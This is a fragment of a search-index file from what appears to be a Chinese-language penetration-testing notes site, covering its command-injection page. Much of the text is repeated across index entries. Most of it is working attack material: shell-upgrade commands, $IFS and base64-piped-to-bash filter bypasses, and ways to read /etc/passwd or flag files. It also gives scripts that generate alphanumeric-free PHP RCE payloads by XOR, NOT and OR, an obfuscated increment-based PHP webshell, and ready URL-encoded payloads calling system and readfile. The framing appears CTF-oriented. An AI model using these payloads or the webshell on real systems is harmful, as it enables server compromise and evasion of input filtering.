extension\u5373\u53ef","title":"\u5927\u6b65\u9aa4"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/","text":"\u547d\u4ee4\u6ce8\u5165 \u76ee\u5f55 Tool shell \u5347\u7ea7 Bypass \u901a\u7528\u578b \u7a7a\u683c &,| \u659c\u6760 \u5173\u952e\u5b57 PHP Bypass \u65e0\u5b57\u6bcd\u6570\u5b57RCE\uff08RCEME\uff09 \u5f02\u6216 \u53d6\u53cd \u81ea\u589e \u6216\u8fd0\u7b97 \u9a9apayload \u4e0b\u5212\u7ebf \u5206\u53f7 \\$\u7b26 php5\u548c7\u7684\u533a\u522b Tool \u53cd\u5f39shell\u751f\u6210 https://www.ddosi.org/shell/ shell \u5347\u7ea7 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python -c 'import pty; pty.spawn(\"/bin/bash\")' \u5b8c\u5168\u4ea4\u4e92\u5f0f $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z $ stty raw -echo $ fg $ reset $ export SHELL=bash //$ export TERM=xterm-256color Bypass \u901a\u7528\u578b \u7a7a\u683c\uff0c\u654f\u611f\u5b57\u7b26 bypass \u9700\u8981echo\uff0c\uff5c\uff0cbash\uff0cbase64\u5b58\u5728 echo${IFS}\"[ PAYLOAD ]\"|base64${IFS}-d|bash ${printf \"\\xaa\"} \u5341\u516d\u8fdb\u5236\u7ed5\u8fc7 ${printf \"\\144\\121\"} \u516b\u8fdb\u5236\u7ed5\u8fc7 \u8bfb\u6587\u4ef6cat\u4e4b\u7c7b\u7684\u88abban\u4e86 curl file:///flag strings /flag uniq -c/etc/passwd bash -v /etc/passwd rev /etc/passwd \u7a7a\u683c $<\u7b26\u53f7 $IFS ${IFS} $IFS$9 %09 \u7528\u4e8eurl\u4f20\u9012 %0a %0d\u4e5f\u53ef\u4ee5 cat</flag {cat,flag} <>\uff08cat<>/flag\uff09 <\uff08cat</flag\uff09 &,| \u659c\u6760 \u901a\u8fc7\u73af\u5883\u53d8\u91cf\u62ff/ \u5047\u8bbe\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u53d8\u91cf\u4e3a\uff1a file=/dir1/dir2/dir3/my.file.txt \u6211\u4eec\u53ef\u4ee5\u7528 ${ } \u5206\u522b\u66ff\u6362\u83b7\u5f97\u4e0d\u540c\u7684\u503c\uff1a ${file#*/}\uff1a\u62ff\u6389\u7b2c\u4e00\u6761 / \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1adir1/dir2/dir3/my.file.txt ${file##*/}\uff1a\u62ff\u6389\u6700\u540e\u4e00\u6761 / \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1amy.file.txt ${file#*.}\uff1a\u62ff\u6389\u7b2c\u4e00\u4e2a . \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1afile.txt ${file##*.}\uff1a\u62ff\u6389\u6700\u540e\u4e00\u4e2a . \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1atxt ${file%/*}\uff1a\u62ff\u6389\u6700\u540e\u6761 / \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a/dir1/dir2/dir3 ${file%%/*}\uff1a\u62ff\u6389\u7b2c\u4e00\u6761 / \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a(\u7a7a\u503c) ${file%.*}\uff1a\u62ff\u6389\u6700\u540e\u4e00\u4e2a . \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a/dir1/dir2/dir3/my.file ${file%%.*}\uff1a\u62ff\u6389\u7b2c\u4e00\u4e2a . \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a/dir1/dir2/dir3/my \u4f7f\u7528\uff1b\u6267\u884c\u591a\u6761\u547d\u4ee4 cd flag_dir;cat flag \u5173\u952e\u5b57 flag -> fla''g fla\"\"g fla\\g \u62fc\u63a5\u7ed5\u8fc7 a=fl;b=ag;cat $a$b PHP Bypass \u65e0\u5b57\u6bcd\u6570\u5b57RCE\uff08RCEME\uff09 \u5f02\u6216 \u8fd9\u91cc\u7684\u5f02\u6216\uff0c\u6307\u7684\u662fphp\u6309\u4f4d\u5f02\u6216\uff0c\u5728php\u4e2d\uff0c\u4e24\u4e2a\u5b57\u7b26\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\u540e\uff0c\u5f97\u5230\u7684\u4f9d\u7136\u662f \u4e00\u4e2a\u5b57\u7b26 \uff0c\u6240\u4ee5\u8bf4\u5f53\u6211\u4eec\u60f3\u5f97\u5230 a-z \u4e2d\u67d0\u4e2a\u5b57\u6bcd\u65f6\uff0c\u5c31\u53ef\u4ee5\u627e\u5230\u4e24\u4e2a\u975e\u5b57\u6bcd\u6570\u5b57\u7684\u5b57\u7b26\uff0c\u53ea\u8981\u4ed6\u4eec\u4fe9\u7684\u5f02\u6216\u7ed3\u679c\u662f\u8fd9\u4e2a\u5b57\u6bcd\u5373\u53ef\u3002\u800c\u5728php\u4e2d\uff0c\u4e24\u4e2a\u5b57\u7b26\u8fdb\u884c\u5f02\u6216\u65f6\uff0c\u4f1a\u5148\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210 ascii\u7801 \u503c\uff0c\u518d\u5c06\u8fd9\u4e2a\u503c\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\uff0c\u7136\u540e\u4e00\u4f4d\u4e00\u4f4d\u7684\u8fdb\u884c\u6309\u4f4d\u5f02\u6216\uff0c\u5f02\u6216\u7684\u89c4\u5219\u662f\uff1a 1^1=0,1^0=1,0^1=1,0^0=0 \uff0c\u7b80\u5355\u7684\u6765\u8bf4\u5c31\u662f \u76f8\u540c\u4e3a\u96f6\uff0c\u4e0d\u540c\u4e3a\u4e00 \u3002 \u6784\u9020\u811a\u672c \u751f\u6210\u5b57\u6bcd\u8868\u7684php\u6587\u4ef6 <?php $myfile = fopen(\"xor_rce.txt\", \"w\"); $contents=\"\"; for ($i=0; $i < 256; $i++) { for ($j=0; $j <256 ; $j++) { \u200b if($i<16){ $hex_i='0'.dechex($i); } else{ $hex_i=dechex($i); } if($j<16){ $hex_j='0'.dechex($j); } else{ $hex_j=dechex($j); } $preg = '/[a-z0-9]/i'; // \u6839\u636e\u9898\u76ee\u7ed9\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4fee\u6539\u5373\u53ef if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ echo \"\"; } \u200b else{ $a='%'.$hex_i; $b='%'.$hex_j; $c=(urldecode($a)^urldecode($b)); if (ord($c)>=32&ord($c)<=126) { $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; } } \u200b } } fwrite($myfile,$contents); fclose($myfile); \u6839\u636e\u5b57\u6bcd\u8868\u6765\u751f\u6210payload\u7684python # -*- coding: utf-8 -*- def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"xor_rce.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function\uff1a\") )+action(input(\"[+] your command\uff1a\"))+\";\" print(param) \u53d6\u53cd <?php //\u5728\u547d\u4ee4\u884c\u4e2d\u8fd0\u884c fwrite(STDOUT,'[+]your function: '); $system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); fwrite(STDOUT,'[+]your command: '); $command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');'; \u81ea\u589e webshell\uff0c\u8bb0\u5f97urlencode $_=[];$_=@\"$_\";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); \u6216\u8fd0\u7b97 \u811a\u672c import re from urllib.parse import unquote import requests preg = '[0-9a-z]'#(\\^)(\\+)(\\~)(\\$)(\\[)(\\])(\\{)(\\})(\\&)(\\-)]'\u53ef\u4ee5\u81ea\u5df1\u6539\u6b63\u5219 filename = 'Or.txt' with open(filename, \"w\") as file_ob: pass for i in range(256): if re.match(preg,chr(i),re.I): continue for j in range(256): if re.match(preg,chr(j),re.I): continue else: if(i < 16): hexI = '%0' + hex(i)[2:] else: hexI = '%' + hex(i)[2:] if(j < 16): hexJ = '%0' + hex(j)[2:] else: hexJ = '%' + hex(j)[2:] if((i|j) >= 32 and (i|j) <= 126): #print(chr(i) + '|'+ chr(j) + \" = \" + chr(i|j) + '--------' , i ,'|' , j , '=' , (i|j)) with open(filename, \"a\") as file_ob: file_ob.write(hexI + '|'+ hexJ + \"=\" + str(chr(i|j)) + '--------' + str(i) + '|' + str(j) + '=' + str((i|j)) + \"\\n\") def rep(args): payload = '' payload1 = '' payload2 = '' with open(filename) as file_ob: lines = file_ob.readlines() for i in args: for line in lines: #print(line) if line[8] == i: #print('(\\\"'+ line[:3] + '\\\"|\\\"' + line[4:7] + '\\\")', end = \"\") payload1 += line[:3] payload2 += line[4:7] break #print(payload) payload = '\\\"' + payload1 + '\\\"|\\\"'+ payload2 + '\\\"' return payload running = True while running: exp = rep(input(\"your payload:\\n\")) print(\"URL\u7f16\u7801\",exp) print(\"\u65e0URL\u7f16\u7801\",unquote(exp)) #url = 'http://' #data = {'c': unquote(exp)} #headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"} #r = requests.post(url, data = data) print(\"-------------\u7ed3\u679c--------------\") #print(r.text) print(\"\\n\") \u6bd4\u5982\u60f3\u6267\u884csystem(\"ls /\") \u5c31\u5f97\u8fd9\u6837 \u9a9apayload ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff^%88%97%90%9E%92%96);&%ff=system ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=readfile ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=highlight_file // \u5373: // ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('whoami');&%ff=system // ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&%ff=readfile // ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&%ff=highlight_file ${%ff%ff%ff%ff^%a0%b8%ba%ab} \u4ee3\u8868${_GET}: ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo \u5373: ${_GET}{%ff}();&%ff=phpinfo //?shell=${_GET}{%ff}();&%ff=phpinfo \u540c\u7406\u4e5f\u53ef\u4ee5\u53d6\u53cd ${~%A0%B8%BA%AB}{%ff}();&%ff=phpinfo ${~%A0%B8%BA%AB}{%ff}(~%88%97%90%9E%92%96);&%ff=system //system('whoami') \u4e5f\u53ef\u4ee5\u7528\u53cd\u5f15\u53f7\u52a0\u77ed\u6807\u7b7e ?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=ls / \u5373: ?><?=`$_GET[%ff]`?>&%ff=ls / \u6700\u5f00\u5934\u7684?>\u95ed\u5408\u4e86 eval() \u51fd\u6570\u81ea\u5e26\u7684<?\u6807\u7b7e\u3002\u63a5\u4e0b\u6765\u4f7f\u7528\u4e86\u77ed\u6807\u7b7e\u4ee3\u66ff<?php echo ... ?>\u3002{}\u91cc\u9762\u5305\u542b\u7684 PHP \u4ee3\u7801\u53ef\u4ee5\u88ab\u6267\u884c\uff0c~%A0%B8%BA%AB\u4e3a_GET\uff0c\u6700\u540e\u5c06\u901a\u8fc7\u53c2\u6570%ff\u4f20\u5165\u7684\u503c\u4f7f\u7528\u53cd\u5f15\u53f7\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u3002 \u4e0b\u5212\u7ebf \u7b80\u5355\uff0c\u6211\u4eec\u4e0a\u9762\u6709\u5f88\u591apayload\u538b\u6839\u5c31\u6ca1\u7528\u5230_ \u5206\u53f7 \u65e0\u9700\u62c5\u5fc3\uff0c\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u8bf4\u4e86\uff0cPHP \u77ed\u6807\u7b7e\u4e2d\u7684\u4ee3\u7801\u4e0d\u9700\u8981\u5199\u5206\u53f7\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u628a\u6240\u6709\u7684 PHP \u8bed\u53e5\u6539\u6210\u77ed\u6807\u7b7e\u5f62\u5f0f\u5c31\u884c\u4e86\u3002 <?=echo (1)?> \\$\u7b26 \u5982\u679cphp7\u4ee5\u4e0a\uff0c\u53ef\u4ee5\u7528\u6216\u8fd0\u7b97\u6216\u8005\u5f02\u6216\u6765\u7ed5\u8fc7\uff0c\u56e0\u4e3a\u5176payload\u91cc\u6ca1\\$\u7b26\u3002\u539f\u56e0\u662fphp7\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528(\\$a)()\u8fd9\u79cd\u65b9\u6cd5\u6765\u6267\u884c\u547d\u4ee4 \u5728 PHP 5 \u4e2d\u5982\u679c\u6211\u4eec\u8fd8\u4f7f\u7528 ('phpinfo')(); \u8fd9\u6837\u7684 PHP \u8868\u8fbe\u5f0f\u5219\u4f1a\u5f97\u5230\u4e00\u4e2a\u62a5\u9519\uff0c\u539f\u56e0\u5c31\u662f PHP 5 \u5e76\u4e0d\u652f\u6301\u8fd9\u79cd\u8868\u8fbe\u65b9\u5f0f\u3002\u6240\u4ee5\uff0c\u5982\u679c\u4e5f\u8fc7\u6ee4\u4e86 $ \u7684\u8bdd\uff0c\u5bf9\u4e8e PHP 5 \u73af\u5883\u7684\u5229\u7528\u65b9\u6cd5\u5c31\u5f88\u590d\u6742\u4e86\u3002 php5\u548c7\u7684\u533a\u522b \u5728\u7814\u7a76\u65e0\u6570\u5b57\u5b57\u6bcdrce\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u51fd\u6570\u5c31\u662f assert \uff0c\u4f46\u5728php5\u7684\u7248\u672c\u548cphp7\u7684\u7248\u672c\u4e2d\uff0c\u5b83\u662f\u6709\u4e00\u4e9b\u533a\u522b\u7684\uff0c\u6211\u4eec\u4e0a\u9762\u7684\u6d4b\u8bd5\u90fd\u662f\u57fa\u4e8ephp5\u8fdb\u884c\u7684\uff0c\u5728php5\u4e2dassert\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 $f='assert';$f(...); \u8fd9\u6837\u7684\u65b9\u6cd5\u6765\u52a8\u6001\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5728php7\u4e2d\uff0cassert\u4e0d\u518d\u662f\u51fd\u6570\uff0c\u53d8\u6210\u4e86\u4e00\u4e2a\u8bed\u8a00\u7ed3\u6784\uff08\u7c7b\u4f3ceval\uff09\uff0c\u4e0d\u80fd\u518d\u4f5c\u4e3a\u51fd\u6570\u540d\u52a8\u6001\u6267\u884c\u4ee3\u7801 \u4f46\u662f\u5728php7\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528(\\$a)()\u8fd9\u79cd\u65b9\u6cd5\u6765\u6267\u884c\u547d\u4ee4\uff0c\u90a3\u76f8\u5f53\u4e8e\u6211\u4eec\u5bf9phpinfo\u53d6\u53cd\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4e86\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9file_put_contents()\u6765\u5199\u5165shell\uff0c\u5728php5\u4e2d\u8fd9\u6837\u662f\u4e0d\u884c\u7684\uff1a","title":"\u547d\u4ee4\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_1","text":"","title":"\u547d\u4ee4\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_2","text":"Tool shell \u5347\u7ea7 Bypass \u901a\u7528\u578b \u7a7a\u683c &,| \u659c\u6760 \u5173\u952e\u5b57 PHP Bypass \u65e0\u5b57\u6bcd\u6570\u5b57RCE\uff08RCEME\uff09 \u5f02\u6216 \u53d6\u53cd \u81ea\u589e \u6216\u8fd0\u7b97 \u9a9apayload \u4e0b\u5212\u7ebf \u5206\u53f7 \\$\u7b26 php5\u548c7\u7684\u533a\u522b","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#tool","text":"\u53cd\u5f39shell\u751f\u6210 https://www.ddosi.org/shell/","title":"Tool"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#shell","text":"python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python -c 'import pty; pty.spawn(\"/bin/bash\")' \u5b8c\u5168\u4ea4\u4e92\u5f0f $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z $ stty raw -echo $ fg $ reset $ export SHELL=bash //$ export TERM=xterm-256color","title":"shell \u5347\u7ea7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#bypass","text":"","title":"Bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_3","text":"\u7a7a\u683c\uff0c\u654f\u611f\u5b57\u7b26 bypass \u9700\u8981echo\uff0c\uff5c\uff0cbash\uff0cbase64\u5b58\u5728 echo${IFS}\"[ PAYLOAD ]\"|base64${IFS}-d|bash ${printf \"\\xaa\"} \u5341\u516d\u8fdb\u5236\u7ed5\u8fc7 ${printf \"\\144\\121\"} \u516b\u8fdb\u5236\u7ed5\u8fc7 \u8bfb\u6587\u4ef6cat\u4e4b\u7c7b\u7684\u88abban\u4e86 curl file:///flag strings /flag uniq -c/etc/passwd bash -v /etc/passwd rev /etc/passwd","title":"\u901a\u7528\u578b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_4","text":"$<\u7b26\u53f7 $IFS ${IFS} $IFS$9 %09 \u7528\u4e8eurl\u4f20\u9012 %0a %0d\u4e5f\u53ef\u4ee5 cat</flag {cat,flag} <>\uff08cat<>/flag\uff09 <\uff08cat</flag\uff09","title":"\u7a7a\u683c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_5","text":"","title":"&amp;,|"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_6","text":"\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u62ff/ \u5047\u8bbe\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u53d8\u91cf\u4e3a\uff1a file=/dir1/dir2/dir3/my.file.txt \u6211\u4eec\u53ef\u4ee5\u7528 ${ } \u5206\u522b\u66ff\u6362\u83b7\u5f97\u4e0d\u540c\u7684\u503c\uff1a ${file#*/}\uff1a\u62ff\u6389\u7b2c\u4e00\u6761 / \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1adir1/dir2/dir3/my.file.txt ${file##*/}\uff1a\u62ff\u6389\u6700\u540e\u4e00\u6761 / \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1amy.file.txt ${file#*.}\uff1a\u62ff\u6389\u7b2c\u4e00\u4e2a . \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1afile.txt ${file##*.}\uff1a\u62ff\u6389\u6700\u540e\u4e00\u4e2a . \u53ca\u5176\u5de6\u8fb9\u7684\u5b57\u4e32\uff1atxt ${file%/*}\uff1a\u62ff\u6389\u6700\u540e\u6761 / \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a/dir1/dir2/dir3 ${file%%/*}\uff1a\u62ff\u6389\u7b2c\u4e00\u6761 / \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a(\u7a7a\u503c) ${file%.*}\uff1a\u62ff\u6389\u6700\u540e\u4e00\u4e2a . \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a/dir1/dir2/dir3/my.file ${file%%.*}\uff1a\u62ff\u6389\u7b2c\u4e00\u4e2a . \u53ca\u5176\u53f3\u8fb9\u7684\u5b57\u4e32\uff1a/dir1/dir2/dir3/my \u4f7f\u7528\uff1b\u6267\u884c\u591a\u6761\u547d\u4ee4 cd flag_dir;cat flag","title":"\u659c\u6760"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_7","text":"flag -> fla''g fla\"\"g fla\\g \u62fc\u63a5\u7ed5\u8fc7 a=fl;b=ag;cat $a$b","title":"\u5173\u952e\u5b57"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#php-bypass","text":"","title":"PHP Bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#rcerceme","text":"","title":"\u65e0\u5b57\u6bcd\u6570\u5b57RCE\uff08RCEME\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_8","text":"\u8fd9\u91cc\u7684\u5f02\u6216\uff0c\u6307\u7684\u662fphp\u6309\u4f4d\u5f02\u6216\uff0c\u5728php\u4e2d\uff0c\u4e24\u4e2a\u5b57\u7b26\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\u540e\uff0c\u5f97\u5230\u7684\u4f9d\u7136\u662f \u4e00\u4e2a\u5b57\u7b26 \uff0c\u6240\u4ee5\u8bf4\u5f53\u6211\u4eec\u60f3\u5f97\u5230 a-z \u4e2d\u67d0\u4e2a\u5b57\u6bcd\u65f6\uff0c\u5c31\u53ef\u4ee5\u627e\u5230\u4e24\u4e2a\u975e\u5b57\u6bcd\u6570\u5b57\u7684\u5b57\u7b26\uff0c\u53ea\u8981\u4ed6\u4eec\u4fe9\u7684\u5f02\u6216\u7ed3\u679c\u662f\u8fd9\u4e2a\u5b57\u6bcd\u5373\u53ef\u3002\u800c\u5728php\u4e2d\uff0c\u4e24\u4e2a\u5b57\u7b26\u8fdb\u884c\u5f02\u6216\u65f6\uff0c\u4f1a\u5148\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210 ascii\u7801 \u503c\uff0c\u518d\u5c06\u8fd9\u4e2a\u503c\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\uff0c\u7136\u540e\u4e00\u4f4d\u4e00\u4f4d\u7684\u8fdb\u884c\u6309\u4f4d\u5f02\u6216\uff0c\u5f02\u6216\u7684\u89c4\u5219\u662f\uff1a 1^1=0,1^0=1,0^1=1,0^0=0 \uff0c\u7b80\u5355\u7684\u6765\u8bf4\u5c31\u662f \u76f8\u540c\u4e3a\u96f6\uff0c\u4e0d\u540c\u4e3a\u4e00 \u3002 \u6784\u9020\u811a\u672c \u751f\u6210\u5b57\u6bcd\u8868\u7684php\u6587\u4ef6 <?php $myfile = fopen(\"xor_rce.txt\", \"w\"); $contents=\"\"; for ($i=0; $i < 256; $i++) { for ($j=0; $j <256 ; $j++) { \u200b if($i<16){ $hex_i='0'.dechex($i); } else{ $hex_i=dechex($i); } if($j<16){ $hex_j='0'.dechex($j); } else{ $hex_j=dechex($j); } $preg = '/[a-z0-9]/i'; // \u6839\u636e\u9898\u76ee\u7ed9\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4fee\u6539\u5373\u53ef if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ echo \"\"; } \u200b else{ $a='%'.$hex_i; $b='%'.$hex_j; $c=(urldecode($a)^urldecode($b)); if (ord($c)>=32&ord($c)<=126) { $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; } } \u200b } } fwrite($myfile,$contents); fclose($myfile); \u6839\u636e\u5b57\u6bcd\u8868\u6765\u751f\u6210payload\u7684python # -*- coding: utf-8 -*- def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"xor_rce.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function\uff1a\") )+action(input(\"[+] your command\uff1a\"))+\";\" 